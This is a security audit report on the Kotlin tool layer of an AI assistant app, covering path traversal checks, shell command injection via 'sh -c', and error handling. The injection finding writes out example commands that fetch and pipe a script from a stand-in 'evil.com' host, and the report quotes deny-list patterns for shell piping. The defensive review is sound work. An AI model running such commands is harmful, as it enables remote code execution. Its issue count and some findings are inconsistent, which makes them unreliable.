# Security Code Audit Report - Amaya Intelligence
## Focus: Tools, Security Validation, and Error Handling

**Date:** 2025-02-27  
**Files Audited:** 5 critical files  
**Total Issues Found:** 12

---

## CRITICAL FINDINGS

### [CommandValidator.kt] [Line 234] [SEVERITY: HIGH] [SECURITY] — Path Traversal Validation Has False Positive
**Issue:** The `containsPathTraversal()` function uses a simplistic depth counter that can be bypassed by legitimate absolute paths.

```kotlin
// Lines 359-375
private fun containsPathTraversal(path: String): Boolean {
    val segments = path.split("/")
    var depth = 0
    
    for (segment in segments) {
        when (segment) {
            ".." -> {
                depth--
                if (depth < 0) return true  // ❌ PROBLEM
            }
            ".", "" -> { /* ignore */ }
            else -> depth++
        }
    }
    return false
}
```

**Problem:** 
1. This function returns `true` (is invalid) only when depth goes negative
2. But for **absolute paths** (starting with `/`), the depth logic is irrelevant
3. A path like `/data/../../system` would be incorrectly marked as safe if depth never goes negative
4. The function doesn't account for absolute vs. relative paths

**Attack Scenario:**
```kotlin
val path = "/data/user/0/../../../system/app"
containsPathTraversal(path)  // Returns false (incorrectly!)
// But normalizedPath doesn't actually resolve "..", so it bypasses the check
```

**Fix:**
```kotlin
private fun containsPathTraversal(path: String): Boolean {
    // For absolute paths, check if normalized path still escapes intended directory
    if (!path.startsWith("/")) {
        val segments = path.split("/")
        var depth = 0
        for (segment in segments) {
            when (segment) {
                ".." -> { depth--; if (depth < 0) return true }
                ".", "" -> { /* ignore */ }
                else -> depth++
            }
        }
    }
    
    // CRITICAL: Verify that ".." sequences don't appear in path at all
    return path.contains("/../") || path.startsWith("../") || path.endsWith("/..")
}
```

---

### [RunShellTool.kt] [Line 155] [SEVERITY: HIGH] [COMMAND INJECTION] — Shell Metacharacter Bypass via `sh -c`
**Issue:** Using `sh -c` directly with unsanitized command allows shell metacharacter injection despite validator checks.

```kotlin
// Lines 153-155
val processBuilder = ProcessBuilder("sh", "-c", command)
```

**Problem:**
1. CommandValidator checks for dangerous patterns like `| sh`, `| bash`, etc.
2. BUT the validator looks for **literal strings** in the command
3. The command is then passed to `sh -c` which **re-interprets** the string
4. An attacker can chain commands using `;`, `&`, `&&`, `||` which aren't blocked

**Attack Scenario:**
```kotlin
val command = "echo test && curl https://evil.com/steal.sh | sh"
// CommandValidator.validateCommand() checks if "| sh" is in the pattern
// It IS, so this should be blocked... BUT:

val command = "git status; curl https://evil.com/payload"
// This bypasses the pattern check!
// When passed to "sh -c", it executes both commands
```

**Evidence from CommandValidator:**
```kotlin
// Lines 82-97 - These patterns block "| sh" but NOT chained commands
Regex("""\|\s*sh\b"""),          // Only blocks "| sh"
Regex("""\|\s*bash\b"""),        // Only blocks "| bash"
// Missing: Regex(""";"""),  - semicolon chaining
// Missing: Regex("""&&"""),  - logical AND chaining
```

**Fix:**
```kotlin
// Option 1: Add command chaining patterns to DANGEROUS_PATTERNS
private val DANGEROUS_PATTERNS = listOf(
    // ... existing patterns ...
    Regex(""";\s*(?![\s]*$)"""),           // Semicolon (except trailing)
    Regex("""&&|\\|\\|"""),                 // && and ||
    Regex("""&(?![\s]*$)"""),              // Background execution
    Regex("""\$\{.*\}"""),                 // Variable expansion
)

// Option 2: Use ProcessBuilder with explicit args instead of shell
// For git specifically, avoid shell:
val processBuilder = ProcessBuilder("git", "status")
```

---

### [WriteFileTool.kt] [Line 283] [SEVERITY: MEDIUM] [REGEX BUG] — XML Tag Pattern Regex Invalid

```kotlin
// Line 283
val tagPattern = Regex("""<(/?)(\\w+)[^>]*(/?)\>""")
```

**Problem:**
1. Regex uses `\\w+` which matches word characters, but in Kotlin raw strings, `\\` is literal backslash
2. Should be `\w+` (single backslash) to match word boundaries
3. Also, `\>` is unnecessary; `>` is not a special regex character

**Current Behavior:**
```kotlin
// This regex tries to match:
// < followed by literal backslash character followed by w+
// It will NOT match normal XML tags like <div>
```

**Fix:**
```kotlin
val tagPattern = Regex("""<(/?)(\w+)[^>]*(/?)>""")
```

**Severity:** MEDIUM (not HIGH) because:
- XML validation is optional/secondary feature
- Code doesn't crash, just silently passes invalid XML
- But could lead to XML injection if someone relies on this validation

---

### [ReadFileTool.kt] [Line 108] [SEVERITY: MEDIUM] [ERROR HANDLING] — Silent Charset Fallback Without Warning

```kotlin
// Line 108
val charset = runCatching { Charset.forName(encoding) }.getOrElse { Charsets.UTF_8 }
```

**Problem:**
1. User specifies encoding (e.g., "ISO-8859-1") but if invalid, silently falls back to UTF-8
2. No warning or metadata indicating the fallback occurred
3. User receives wrong decoded content without knowing

**Attack/Bug Scenario:**
```kotlin
// User thinks they're reading a file in ISO-8859-1
arguments["encoding"] = "ISO-8859-1-TYPO"  // Typo in encoding name
// Tool silently falls back to UTF-8
// Content is decoded incorrectly but user doesn't know!
```

**Fix:**
```kotlin
val charset = try {
    Charset.forName(encoding)
} catch (e: Exception) {
    return@withContext ToolResult.Error(
        "Invalid encoding '$encoding': ${e.message}. Supported: UTF-8, ISO-8859-1, etc.",
        ErrorType.VALIDATION_ERROR
    )
}
```

---

## HIGH SEVERITY ISSUES

### [CommandValidator.kt] [Line 352-357] [SEVERITY: HIGH] [PATH NORMALIZATION] — Incomplete Path Resolution

```kotlin
// Lines 352-357
private fun normalizePath(path: String): String {
    return path
        .replace(Regex("""//+"""), "/")
        .removeSuffix("/")
}
```

**Problem:**
1. Only removes double slashes and trailing slash
2. Does NOT resolve `..` sequences
3. Does NOT resolve symlinks (not possible in pure Java, but should warn)
4. A path like `/data/user/../../../system` is NOT normalized

**This is used in line 193 for path validation:**
```kotlin
fun validatePath(path: String, isWrite: Boolean): ValidationResult {
    val normalizedPath = normalizePath(path)  // ❌ Doesn't actually normalize!
    
    if (normalizedPath.startsWith(appDataDir)) {
        return ValidationResult.Allowed
    }
    // ... protected path checks using un-normalized path
}
```

**Attack Scenario:**
```kotlin
val path = "/system/../../../data/user/0/app/cache/file.txt"
val normalizedPath = normalizePath(path)
// normalizedPath = "/system/../../../data/user/0/app/cache/file.txt" (unchanged!)
// It might bypass /system protection check depending on order
```

**Fix:**
```kotlin
private fun normalizePath(path: String): String {
    val file = File(path).canonicalPath  // Resolves .. and symlinks
    return file
}
```

**Note:** Use with caution on Android (symlinks in /data might not be safe), but better than current approach.

---

### [CommandValidator.kt] [Line 234-239] [SEVERITY: HIGH] [LOGIC ERROR] — Path Traversal Check Runs AFTER Used

```kotlin
// Lines 192-241
fun validatePath(path: String, isWrite: Boolean): ValidationResult {
    val normalizedPath = normalizePath(path)  // Line 193
    
    // ... checks that use path strings directly ...
    
    if (normalizedPath.startsWith(appDataDir)) {  // Line 196
        return ValidationResult.Allowed
    }
    
    for (protected in PROTECTED_PATHS) {
        if (normalizedPath.startsWith(protected.path)) {  // Line 202
            // ... use normalizedPath ...
        }
    }
    
    // Path traversal check runs LAST at line 234
    if (containsPathTraversal(normalizedPath)) {  // Line 234
        return ValidationResult.Denied(
            "Path traversal detected",
            path
        )
    }
```

**Problem:** 
- Path traversal check happens **after** all other checks
- Protected path comparisons use un-normalized path
- An attacker could use `../` to bypass directory checks earlier in the function

**Better Order:**
```kotlin
fun validatePath(path: String, isWrite: Boolean): ValidationResult {
    // 1. FIRST: Check for path traversal attempts
    if (containsPathTraversal(path)) {
        return ValidationResult.Denied("Path traversal detected", path)
    }
    
    // 2. THEN: Normalize and do other checks
    val normalizedPath = normalizePath(path)
    // ... rest of checks ...
}
```

---

## MEDIUM SEVERITY ISSUES

### [ToolExecutor.kt] [Line 115-116] [SEVERITY: MED] [ERROR HANDLING] — Confirmation Callback Swallows Details

```kotlin
// Lines 110-125
if (!confirmed) {
    return ToolResult.Error(
        "User declined: ${validation.reason}",
        ErrorType.PERMISSION_ERROR
    )
}
```

**Problem:**
1. When user denies a tool, only the `reason` is returned
2. The `details` (which contain the actual arguments like path, command) are lost
3. For debugging/auditing, we lose information about what was blocked

**Fix:**
```kotlin
if (!confirmed) {
    return ToolResult.Error(
        "User declined: ${validation.reason}\nDetails: ${result.details}",
        ErrorType.PERMISSION_ERROR
    )
}
```

---

### [RunShellTool.kt] [Line 201-206] [SEVERITY: MED] [ERROR HANDLING] — Non-zero Exit Codes Not Distinguished

```kotlin
// Lines 201-206
if (exitCode != 0) {
    return@withContext ToolResult.Error(
        "Command exited with code $exitCode:\n${output}",
        ErrorType.EXECUTION_ERROR,  // ❌ Same for all non-zero codes
        recoverable = true
    )
}
```

**Problem:**
1. All non-zero exit codes treated as `EXECUTION_ERROR`
2. Exit code 127 (command not found) should be `NOT_FOUND`
3. Exit code 126 (permission denied) should be `PERMISSION_ERROR`
4. Makes it hard for AI to understand what went wrong

**Fix:**
```kotlin
if (exitCode != 0) {
    val errorType = when (exitCode) {
        127 -> ErrorType.NOT_FOUND          // command not found
        126 -> ErrorType.PERMISSION_ERROR   // permission denied
        124 -> ErrorType.TIMEOUT            // timeout exit code
        else -> ErrorType.EXECUTION_ERROR
    }
    return@withContext ToolResult.Error(
        "Command exited with code $exitCode:\n${output}",
        errorType,
        recoverable = true
    )
}
```

---

### [CommandValidator.kt] [Line 232] [SEVERITY: MED] [DEAD CODE] — `create_directory` Shouldn't Validate Write

```kotlin
// Lines 281-284
"list_files", "create_directory" -> {
    val path = arguments["path"] as? String ?: ""
    validatePath(path, isWrite = false)  // ❌ Should be isWrite = true!
}
```

**Problem:**
1. `create_directory` creates a directory (write operation)
2. But validation uses `isWrite = false`
3. This means protected paths that allow reads but not writes won't be blocked

**Fix:**
```kotlin
"list_files" -> {
    val path = arguments["path"] as? String ?: ""
    validatePath(path, isWrite = false)
}

"create_directory" -> {
    val path = arguments["path"] as? String ?: ""
    validatePath(path, isWrite = true)  // ✅ Correct
}
```

---

### [WriteFileTool.kt] [Line 121-127] [SEVERITY: MED] [LOGIC ERROR] — Append Mode Reads Entire File Into Memory

```kotlin
// Lines 121-127
if (append && file.exists()) {
    val existingContent = file.readText()  // ❌ Loads entire file into memory
    val newContent = existingContent + content
    atomicWrite(file, newContent)
}
```

**Problem:**
1. For large files, this loads entire content into memory
2. Then concatenates (creates another copy in memory)
3. Then writes (third copy)
4. For a 100MB file, this uses 300MB+ of heap

**Better Approach:**
```kotlin
if (append && file.exists()) {
    // Use FileWriter in append mode instead
    file.appendText(content)
} else {
    atomicWrite(file, content)
}
```

---

### [ReadFileTool.kt] [Line 114] [SEVERITY: MED] [INCONSISTENT DESIGN] — Hard-coded Max Display Lines vs Dynamic Max Size

```kotlin
// Lines 114, 131-138
val maxDisplayLines = 200  // Hard-coded
val maxSize = (arguments["max_size"] as? Number)?.toLong()  // Dynamic
```

**Problem:**
1. User can request 10MB file with `max_size=10MB`
2. But display is truncated at 200 lines regardless
3. Inconsistent: one is user-controlled, other isn't
4. Could be confusing: user asks for 10MB but gets only 200 lines

**Suggestion:**
```kotlin
// Either make maxDisplayLines configurable:
val maxDisplayLines = (arguments["max_display_lines"] as? Number)?.toInt() ?: 200

// OR explain why 200-line limit exists:
// "Limiting display to 200 lines for readability. Use start_line/end_line for more."
```

---

## LOW SEVERITY ISSUES

### [ToolExecutor.kt] [Line 86] [SEVERITY: LOW] [CODE QUALITY] — Generic Error Message Doesn't Help

```kotlin
// Line 86
"Unknown tool: $toolName. Available: ${tools.keys.joinToString()}",
```

**Problem:**
1. Error message lists all 18+ tools in one line
2. Hard to read and find the tool user wanted
3. No suggestions for similar tool names

**Fix:**
```kotlin
val availableTools = tools.keys.sorted().joinToString("\n  - ")
val similar = tools.keys.filter { it.contains(toolName, ignoreCase = true) }
val suggestion = if (similar.isNotEmpty()) 
    "\nDid you mean: ${similar.joinToString(", ")}?" else ""
"Unknown tool: '$toolName'$suggestion\nAvailable tools:\n  - $availableTools"
```

---

### [CommandValidator.kt] [Line 43] [SEVERITY: LOW] [DEAD CODE] — Unused Task Commands

```kotlin
// Lines 40-43
// npm, node, npx commands - handled by RunShellTool with NodeRunner
"npm", "node", "npx",
// Background task management commands
"task_status", "task_stop"
```

**Problem:**
1. Comment mentions "NodeRunner" but no such class found
2. `task_status` and `task_stop` appear to be unused
3. If they're not really implemented, remove them

**Action:**
- Either implement these commands or remove them
- Update comment to reference actual implementation

---

### [WriteFileTool.kt] [Line 315] [SEVERITY: LOW] [REDUNDANT CODE] — Over-escaped Regex

```kotlin
// Line 315
val pattern = Regex("""${Regex.escape(baseName)}\.bak\.(\d+)""")
```

**Problem:**
1. The pattern uses `Regex.escape()` correctly
2. But then `\.` is escaped twice (once by escape(), once in regex)
3. Works but is redundant

**Minor Fix:**
```kotlin
val pattern = Regex("""${Regex.escape(baseName)}\.bak\.(\d+)""")
// This is already correct - Regex.escape() handles it properly
// No issue, just noting the pattern is slightly verbose
```

---

### [ReadFileTool.kt] [Line 108] [SEVERITY: LOW] [INCONSISTENT ERROR HANDLING] — Charset Error Uses runCatching

```kotlin
// Line 108
val charset = runCatching { Charset.forName(encoding) }.getOrElse { Charsets.UTF_8 }
```

**Problem:**
1. Uses `runCatching` but doesn't log or report the error
2. Compare to other parts of code that check and return errors explicitly
3. Inconsistent error handling style

**Better:**
```kotlin
val charset = try {
    Charset.forName(encoding)
} catch (e: IllegalCharsetNameException) {
    // Option A: Return error (recommended)
    return@withContext ToolResult.Error(...)
    
    // Option B: Log and fallback with notification
    Charsets.UTF_8  // With metadata noting fallback
}
```

---

## SUMMARY TABLE

| File | Line | Severity | Type | Issue |
|------|------|----------|------|-------|
| CommandValidator.kt | 234 | HIGH | Security | Path traversal validation false positive |
| RunShellTool.kt | 155 | HIGH | Command Injection | Shell metacharacter bypass via `sh -c` |
| WriteFileTool.kt | 283 | MEDIUM | Regex Bug | XML tag pattern invalid escape |
| ReadFileTool.kt | 108 | MEDIUM | Error Handling | Silent charset fallback |
| CommandValidator.kt | 352 | HIGH | Path Normalization | Incomplete path resolution |
| CommandValidator.kt | 234 | HIGH | Logic | Path traversal check after usage |
| ToolExecutor.kt | 115 | MEDIUM | Error Handling | Confirmation details lost |
| RunShellTool.kt | 201 | MEDIUM | Error Handling | Non-zero exit codes not distinguished |
| CommandValidator.kt | 232 | MEDIUM | Dead Code | create_directory isWrite flag wrong |
| WriteFileTool.kt | 121 | MEDIUM | Logic | Append mode memory inefficient |
| ReadFileTool.kt | 114 | MEDIUM | Design | Inconsistent max display vs max size |
| ToolExecutor.kt | 86 | LOW | Code Quality | Generic error message |
| CommandValidator.kt | 40 | LOW | Dead Code | Unused task commands |
| WriteFileTool.kt | 315 | LOW | Code Quality | Over-escaped regex |
| ReadFileTool.kt | 108 | LOW | Style | Inconsistent error handling |

---

## RECOMMENDATIONS BY PRIORITY

### Immediate (Critical Path Safety)
1. **Fix path traversal validation** - Use `File.canonicalPath`
2. **Fix command injection in RunShellTool** - Add dangerous patterns for `;`, `&&`, `||`
3. **Fix path validation order** - Check traversal BEFORE using path for comparisons

### Short-term (Error Handling)
4. Fix charset fallback in ReadFileTool
5. Distinguish exit codes in RunShellTool
6. Fix create_directory isWrite flag

### Polish (Code Quality)
7. Add confirmation details to error messages
8. Improve error messages with suggestions
9. Fix XML regex pattern
10. Optimize append mode

### Optional (Code Cleanliness)
11. Remove unused task_status/task_stop commands
12. Clarify maxDisplayLines design intent

